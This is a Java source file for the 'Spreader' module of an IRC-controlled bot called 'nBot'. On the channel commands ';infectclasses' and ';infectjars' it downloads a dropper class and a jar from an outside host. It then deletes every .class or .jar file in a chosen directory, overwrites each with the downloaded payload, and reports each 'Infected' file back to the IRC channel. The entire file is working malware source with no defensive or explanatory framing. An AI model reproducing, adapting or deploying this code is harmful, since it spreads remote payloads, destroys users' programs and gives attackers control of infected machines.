
import java.io.File;
import java.io.IOException;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class Spreader implements Handler {

    public static File file = new File(".");

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";infectclasses")) {
            try {
                if (args.length == 1) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Injecting class files in current dir!");
                    infectClasses(".");
                } else {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Infecting class files in " + args[1]);
                    infectClasses(args[1]);
                }
                return true;
            } catch (IOException e) {
                return false;
            }
        }
        if (args[0].equals(";infectjars")) {
            try {
                if (args.length == 1) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Infecting jar files in current dir!");
                    infectJars(".");
                } else {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Infecting jar files in " + args[1]);
                    infectJars(args[1]);
                }
                return true;
            } catch (IOException e) {
                return false;
            }
        }
        return false;
    }

    public static void infectClasses(String l) throws IOException {
        file = new File(l);
        File[] files = file.listFiles();
        new Downloader().download("epicpanda.hostei.com/dropper.class", System.getProperty("user.home") + "\\d.class");
        for (File f : files) {
            if (f.getName().contains(".class") || f.getName().contains(".CLASS")) {
                f.delete();
                Misc.copy(System.getProperty("user.home") + "\\d.class", f.getCanonicalPath());
                IRC.sendMessage(Config.channel, "Infected " + f.getName());
            }
        }
    }

    public static void infectJars(String l) throws IOException {
        file = new File(l);
        File[] files = file.listFiles();
        new Downloader().download("epicpanda.hostei.com/bin.jar", System.getProperty("user.home") + "\\bsd.jar");
        for (File f : files) {
            if (f.getName().contains(".jar") || f.getName().contains(".JAR")) {
                f.delete();
                Misc.copy(System.getProperty("user.home") + "\\bsd.jar", f.getCanonicalPath());
                IRC.sendMessage(Config.channel, "Infected " + f.getName());
            }
        }
    }
}
